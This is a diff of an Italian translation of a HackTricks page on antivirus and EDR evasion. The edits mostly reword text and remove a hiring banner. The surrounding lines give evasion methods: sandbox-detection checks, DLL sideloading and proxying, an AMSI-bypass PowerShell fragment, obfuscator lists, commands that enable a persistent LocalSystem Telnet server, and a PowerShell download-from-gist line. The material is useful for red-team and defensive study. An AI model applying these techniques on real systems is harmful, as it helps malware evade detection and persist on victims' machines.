@@ -2,12 +2,6 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-<figure><img src="../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-Se sei interessato a una **carriera nel hacking** e a hackare l'inhackabile - **stiamo assumendo!** (_richiesta di polacco fluente scritto e parlato_).
-
-{% embed url="https://www.stmcyber.com/careers" %}
-
 **Questa pagina è stata scritta da** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**
 
 ## **Metodologia di Evasione AV**
@@ -16,7 +10,7 @@ Attualmente, gli AV utilizzano diversi metodi per controllare se un file è male
 
 ### **Rilevamento statico**
 
-Il rilevamento statico si ottiene contrassegnando stringhe o array di byte malevoli noti in un binario o script, ed estraendo anche informazioni dal file stesso (ad es. descrizione del file, nome dell'azienda, firme digitali, icona, checksum, ecc.). Questo significa che utilizzare strumenti pubblici noti potrebbe farti catturare più facilmente, poiché probabilmente sono stati analizzati e contrassegnati come malevoli. Ci sono un paio di modi per aggirare questo tipo di rilevamento:
+Il rilevamento statico si ottiene contrassegnando stringhe o array di byte malevoli noti in un binario o script, ed estraendo anche informazioni dal file stesso (ad es. descrizione del file, nome dell'azienda, firme digitali, icona, checksum, ecc.). Questo significa che utilizzare strumenti pubblici noti può farti catturare più facilmente, poiché probabilmente sono stati analizzati e contrassegnati come malevoli. Ci sono un paio di modi per aggirare questo tipo di rilevamento:
 
 - **Crittografia**
 
@@ -31,38 +25,38 @@ A volte tutto ciò che devi fare è cambiare alcune stringhe nel tuo binario o s
 Se sviluppi i tuoi strumenti, non ci saranno firme malevole note, ma questo richiede molto tempo e impegno.
 
 > [!NOTE]
-> Un buon modo per controllare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Fondamentalmente, divide il file in più segmenti e poi chiede a Defender di scansionare ciascuno individualmente, in questo modo, può dirti esattamente quali sono le stringhe o i byte contrassegnati nel tuo binario.
+> Un buon modo per controllare il rilevamento statico di Windows Defender è [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Fondamentalmente divide il file in più segmenti e poi chiede a Defender di scansionare ciascuno individualmente, in questo modo, può dirti esattamente quali sono le stringhe o i byte contrassegnati nel tuo binario.
 
 Ti consiglio vivamente di dare un'occhiata a questa [playlist di YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sull'evasione pratica degli AV.
 
 ### **Analisi dinamica**
 
-L'analisi dinamica è quando l'AV esegue il tuo binario in un sandbox e osserva attività malevole (ad es. cercare di decrittografare e leggere le password del browser, eseguire un minidump su LSASS, ecc.). Questa parte può essere un po' più complicata da gestire, ma ecco alcune cose che puoi fare per evadere le sandbox.
+L'analisi dinamica è quando l'AV esegue il tuo binario in un sandbox e osserva attività malevole (ad es. cercare di decrittografare e leggere le password del tuo browser, eseguire un minidump su LSASS, ecc.). Questa parte può essere un po' più complicata da gestire, ma ecco alcune cose che puoi fare per evadere i sandbox.
 
-- **Sonno prima dell'esecuzione** A seconda di come è implementato, può essere un ottimo modo per bypassare l'analisi dinamica dell'AV. Gli AV hanno un tempo molto breve per scansionare i file per non interrompere il flusso di lavoro dell'utente, quindi utilizzare sonni lunghi può disturbare l'analisi dei binari. Il problema è che molte sandbox degli AV possono semplicemente saltare il sonno a seconda di come è implementato.
-- **Controllo delle risorse della macchina** Di solito le sandbox hanno pochissime risorse con cui lavorare (ad es. < 2GB di RAM), altrimenti potrebbero rallentare la macchina dell'utente. Puoi anche essere molto creativo qui, ad esempio controllando la temperatura della CPU o persino la velocità delle ventole, non tutto sarà implementato nella sandbox.
+- **Sonno prima dell'esecuzione** A seconda di come è implementato, può essere un ottimo modo per bypassare l'analisi dinamica dell'AV. Gli AV hanno un tempo molto breve per scansionare i file per non interrompere il flusso di lavoro dell'utente, quindi utilizzare sonni lunghi può disturbare l'analisi dei binari. Il problema è che molti sandbox degli AV possono semplicemente saltare il sonno a seconda di come è implementato.
+- **Controllo delle risorse della macchina** Di solito i sandbox hanno pochissime risorse con cui lavorare (ad es. < 2GB di RAM), altrimenti potrebbero rallentare la macchina dell'utente. Puoi anche essere molto creativo qui, ad esempio controllando la temperatura della CPU o persino la velocità delle ventole, non tutto sarà implementato nel sandbox.
 - **Controlli specifici della macchina** Se vuoi mirare a un utente la cui workstation è unita al dominio "contoso.local", puoi fare un controllo sul dominio del computer per vedere se corrisponde a quello che hai specificato, se non corrisponde, puoi far uscire il tuo programma.
 
-Si scopre che il nome della macchina della Sandbox di Microsoft Defender è HAL9TH, quindi puoi controllare il nome del computer nel tuo malware prima della detonazione, se il nome corrisponde a HAL9TH, significa che sei all'interno della sandbox di Defender, quindi puoi far uscire il tuo programma.
+Si scopre che il nome del computer del Sandbox di Microsoft Defender è HAL9TH, quindi puoi controllare il nome del computer nel tuo malware prima della detonazione, se il nome corrisponde a HAL9TH, significa che sei all'interno del sandbox di Defender, quindi puoi far uscire il tuo programma.
 
 <figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>
 
-Altri ottimi consigli da [@mgeeky](https://twitter.com/mariuszbit) per contrastare le Sandbox
+Altri ottimi consigli da [@mgeeky](https://twitter.com/mariuszbit) per contrastare i Sandbox
 
 <figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canale #malware-dev</p></figcaption></figure>
 
-Come abbiamo detto prima in questo post, **gli strumenti pubblici** alla fine **verranno rilevati**, quindi dovresti chiederti qualcosa:
+Come abbiamo detto prima in questo post, **gli strumenti pubblici** verranno eventualmente **rilevati**, quindi dovresti chiederti qualcosa:
 
-Ad esempio, se vuoi dumpare LSASS, **hai davvero bisogno di usare mimikatz**? O potresti usare un progetto diverso che è meno conosciuto e dumpa anche LSASS.
+Ad esempio, se vuoi eseguire il dump di LSASS, **hai davvero bisogno di usare mimikatz**? O potresti usare un progetto diverso che è meno conosciuto e che esegue anche il dump di LSASS.
 
-La risposta giusta è probabilmente la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei, se non il più contrassegnato malware dagli AV e dagli EDR, mentre il progetto stesso è super interessante, è anche un incubo lavorarci per aggirare gli AV, quindi cerca semplicemente alternative per ciò che stai cercando di ottenere.
+La risposta giusta è probabilmente la seconda. Prendendo mimikatz come esempio, è probabilmente uno dei, se non il più contrassegnato malware dagli AV e dagli EDR, mentre il progetto stesso è super interessante, è anche un incubo lavorarci per aggirare gli AV, quindi cerca alternative per ciò che stai cercando di ottenere.
 
 > [!NOTE]
-> Quando modifichi i tuoi payload per l'evasione, assicurati di **disattivare l'invio automatico dei campioni** in Defender, e per favore, seriamente, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è raggiungere l'evasione a lungo termine. Se vuoi controllare se il tuo payload viene rilevato da un particolare AV, installalo su una VM, prova a disattivare l'invio automatico dei campioni e testalo lì finché non sei soddisfatto del risultato.
+> Quando modifichi i tuoi payload per l'evasione, assicurati di **disattivare l'invio automatico dei campioni** in Defender, e per favore, seriamente, **NON CARICARE SU VIRUSTOTAL** se il tuo obiettivo è ottenere evasione a lungo termine. Se vuoi controllare se il tuo payload viene rilevato da un particolare AV, installalo su una VM, prova a disattivare l'invio automatico dei campioni e testalo lì finché non sei soddisfatto del risultato.
 
 ## EXE vs DLL
 
-Ogni volta che è possibile, **dai sempre priorità all'uso delle DLL per l'evasione**, nella mia esperienza, i file DLL sono di solito **molto meno rilevati** e analizzati, quindi è un trucco molto semplice da usare per evitare il rilevamento in alcuni casi (se il tuo payload ha un modo di essere eseguito come DLL, ovviamente).
+Ogni volta che è possibile, **dai sempre priorità all'uso delle DLL per l'evasione**, nella mia esperienza, i file DLL sono solitamente **molto meno rilevati** e analizzati, quindi è un trucco molto semplice da usare per evitare il rilevamento in alcuni casi (se il tuo payload ha un modo di eseguire come DLL, ovviamente).
 
 Come possiamo vedere in questa immagine, un Payload DLL di Havoc ha un tasso di rilevamento di 4/26 in antiscan.me, mentre il payload EXE ha un tasso di rilevamento di 7/26.
 
@@ -72,7 +66,7 @@ Ora mostreremo alcuni trucchi che puoi usare con i file DLL per essere molto pi�
 
 ## Sideloading DLL & Proxying
 
-**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL utilizzato dal caricatore posizionando sia l'applicazione vittima che il/i payload malevolo/i uno accanto all'altro.
+**DLL Sideloading** sfrutta l'ordine di ricerca delle DLL utilizzato dal caricatore posizionando sia l'applicazione vittima che il payload malevolo accanto l'uno all'altro.
 
 Puoi controllare i programmi suscettibili al DLL Sideloading utilizzando [Siofra](https://github.com/Cybereason/siofra) e il seguente script di powershell:
 ```powershell
@@ -83,7 +77,7 @@ C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hija
 ```
 Questo comando restituirà l'elenco dei programmi suscettibili al DLL hijacking all'interno di "C:\Program Files\\" e i file DLL che tentano di caricare.
 
-Ti consiglio vivamente di **esplorare i programmi DLL Hijackable/Sideloadable da solo**, questa tecnica è piuttosto furtiva se eseguita correttamente, ma se utilizzi programmi DLL Sideloadable pubblicamente noti, potresti essere facilmente catturato.
+Ti consiglio vivamente di **esplorare i programmi DLL Hijackable/Sideloadable da solo**, questa tecnica è piuttosto furtiva se eseguita correttamente, ma se utilizzi programmi Sideloadable DLL pubblicamente noti, potresti essere facilmente scoperto.
 
 Semplicemente posizionare una DLL malevola con il nome che un programma si aspetta di caricare, non caricherà il tuo payload, poiché il programma si aspetta alcune funzioni specifiche all'interno di quella DLL; per risolvere questo problema, utilizzeremo un'altra tecnica chiamata **DLL Proxying/Forwarding**.
 
@@ -187,7 +181,7 @@ $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
 $Spotfix.SetValue($null,$true)
 }Catch{Throw $_}
 ```
-Tieni presente che questo verrà probabilmente segnalato una volta pubblicato, quindi non dovresti pubblicare alcun codice se il tuo piano è rimanere non rilevato.
+Tieni presente che questo verrà probabilmente segnalato una volta che questo post verrà pubblicato, quindi non dovresti pubblicare alcun codice se il tuo piano è rimanere non rilevato.
 
 **Memory Patching**
 
@@ -207,7 +201,7 @@ Ci sono diversi strumenti che possono essere utilizzati per **offuscare il codic
 - [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: offuscatore C#**
 - [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L'obiettivo di questo progetto è fornire un fork open-source della suite di compilazione [LLVM](http://www.llvm.org/) in grado di fornire maggiore sicurezza software attraverso [l'offuscamento del codice](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e la protezione contro manomissioni.
 - [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator dimostra come utilizzare il linguaggio `C++11/14` per generare, al momento della compilazione, codice offuscato senza utilizzare alcuno strumento esterno e senza modificare il compilatore.
-- [**obfy**](https://github.com/fritzone/obfy): Aggiungi uno strato di operazioni offuscate generate dal framework di metaprogrammazione C++ che renderà un po' più difficile la vita a chi vuole craccare l'applicazione.
+- [**obfy**](https://github.com/fritzone/obfy): Aggiungi uno strato di operazioni offuscate generate dal framework di metaprogrammazione C++ che renderà la vita della persona che desidera craccare l'applicazione un po' più difficile.
 - [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz è un offuscatore binario x64 in grado di offuscare vari file pe diversi tra cui: .exe, .dll, .sys
 - [**metame**](https://github.com/a0rtega/metame): Metame è un semplice motore di codice metamorfico per eseguibili arbitrari.
 - [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di offuscamento del codice a grana fine per linguaggi supportati da LLVM che utilizza ROP (programmazione orientata al ritorno). ROPfuscator offusca un programma a livello di codice assembly trasformando istruzioni normali in catene ROP, ostacolando la nostra concezione naturale del normale flusso di controllo.
@@ -222,7 +216,7 @@ Microsoft Defender SmartScreen è un meccanismo di sicurezza destinato a protegg
 
 <figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>
 
-SmartScreen funziona principalmente con un approccio basato sulla reputazione, il che significa che le applicazioni scaricate raramente attiveranno SmartScreen, avvisando e impedendo all'utente finale di eseguire il file (anche se il file può comunque essere eseguito cliccando su Maggiori informazioni -> Esegui comunque).
+SmartScreen funziona principalmente con un approccio basato sulla reputazione, il che significa che le applicazioni scaricate raramente attiveranno SmartScreen, avvisando e impedendo all'utente finale di eseguire il file (anche se il file può ancora essere eseguito facendo clic su Maggiori informazioni -> Esegui comunque).
 
 **MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome di Zone.Identifier che viene creato automaticamente al momento del download di file da internet, insieme all'URL da cui è stato scaricato.
 
@@ -273,7 +267,7 @@ La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, H
 
 - **Fork\&Run**
 
-Comporta **la creazione di un nuovo processo sacrificabile**, iniettando il tuo codice malevolo di post-exploitation in quel nuovo processo, eseguendo il tuo codice malevolo e, una volta terminato, uccidendo il nuovo processo. Questo ha sia vantaggi che svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del nostro processo di impianto Beacon. Ciò significa che se qualcosa nella nostra azione di post-exploitation va storto o viene catturato, c'è una **probabilità molto maggiore** che il nostro **impianto sopravviva.** Lo svantaggio è che hai una **maggiore probabilità** di essere catturato da **Rilevamenti Comportamentali**.
+Comporta **la creazione di un nuovo processo sacrificial**, iniettare il tuo codice malevolo di post-exploitation in quel nuovo processo, eseguire il tuo codice malevolo e, quando hai finito, terminare il nuovo processo. Questo ha sia vantaggi che svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del nostro processo di impianto Beacon. Questo significa che se qualcosa nella nostra azione di post-exploitation va storto o viene catturato, c'è una **probabilità molto maggiore** che il nostro **impianto sopravviva.** Lo svantaggio è che hai una **maggiore probabilità** di essere catturato da **Rilevamenti Comportamentali**.
 
 <figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>
 
@@ -314,7 +308,7 @@ Questo è anche un altro grande intervento di [@mariuszbit](https://twitter.com/
 
 ### **Controlla quali parti Defender trova come malevole**
 
-Puoi utilizzare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) che **rimuoverà parti del binario** fino a **scoprire quale parte Defender** trova come malevole e te lo dividerà.\
+Puoi utilizzare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) che **rimuoverà parti del binario** fino a **scoprire quale parte Defender** trova come malevola e te lo dividerà.\
 Un altro strumento che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred) con un'offerta web aperta che fornisce il servizio in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)
 
 ### **Server Telnet**
@@ -323,7 +317,7 @@ Fino a Windows 10, tutte le versioni di Windows venivano fornite con un **server
 ```bash
 pkgmgr /iu:"TelnetServer" /quiet
 ```
-Fallo **partire** quando il sistema viene avviato e **eseguilo** ora:
+Fallo **partire** quando il sistema è avviato e **eseguilo** ora:
 ```bash
 sc config TlntSVR start= auto obj= localsystem
 ```
@@ -481,7 +475,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 ```
 {% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}
 
-Elenco di obfuscatori C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
+Elenco di offuscatori C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
 
 ### C++
 ```
@@ -529,10 +523,5 @@ https://github.com/praetorian-code/vulcan
 
 - [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)
 
-<figure><img src="../images/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-Se sei interessato a una **carriera nel hacking** e a hackare l'inhackabile - **stiamo assumendo!** (_richiesta conoscenza fluente del polacco scritto e parlato_).
-
-{% embed url="https://www.stmcyber.com/careers" %}
 
 {{#include ../banners/hacktricks-training.md}}
